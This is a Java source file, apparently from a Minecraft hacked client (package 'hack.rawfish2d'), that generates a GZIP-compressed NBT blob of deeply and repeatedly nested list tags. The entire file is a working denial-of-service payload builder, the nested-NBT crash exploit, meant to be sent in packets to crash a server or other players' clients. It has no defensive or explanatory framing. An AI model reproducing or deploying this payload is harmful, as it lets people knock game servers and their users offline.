package hack.rawfish2d.client.utils;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.util.zip.GZIPOutputStream;


public class TooLongNBT
{
	private byte[] data;
	
	public int getDataLength() {
		return data.length;
	}
	
	public byte[] getData() {
		return data;
	}
	
	@SuppressWarnings("unused")
	public void init(int lists) throws Throwable {
		/*
		ByteArrayOutputStream bytestream = new ByteArrayOutputStream();
		DataOutputStream nbtdos = new DataOutputStream(new GZIPOutputStream(bytestream));
		nbtdos.writeByte(10);
		nbtdos.writeUTF("");
		
		for (int i = 0; i < lists; i++) {
			writeLists(nbtdos, 0);
		}
		
		nbtdos.writeByte(0);
		nbtdos.close();
		data = bytestream.toByteArray();
		*/
		
		ByteArrayOutputStream bytestream;
        bytestream = new ByteArrayOutputStream();
        Throwable throwable = null;
        Object var2_3 = null;
        try {
            DataOutputStream nbtdos = new DataOutputStream(new GZIPOutputStream(bytestream));
            try {
                nbtdos.writeByte(10);
                nbtdos.writeUTF("");
                int i = 0;
                while (i < 300) {
                    writeLists(nbtdos, 0);
                    ++i;
                }
                nbtdos.writeByte(0);
            }
            finally {
                if (nbtdos != null) {
                    nbtdos.close();
                }
            }
        }
        catch (Throwable throwable2) {
            if (throwable == null) {
                throwable = throwable2;
            } else if (throwable != throwable2) {
                throwable.addSuppressed(throwable2);
            }
            throw throwable;
        }
        data = bytestream.toByteArray();
	}
	
	private void writeLists(DataOutputStream dos, int count) throws IOException {
		if (count <= 4) {
			dos.writeByte(9);
			dos.writeUTF("");
			dos.writeByte(9); //packet id 9 (139)
			dos.writeInt(10);
		
			for (int i = 1; i < 10; i++) {
				writeLists(dos, count + 1);
			}
		}
	}
}
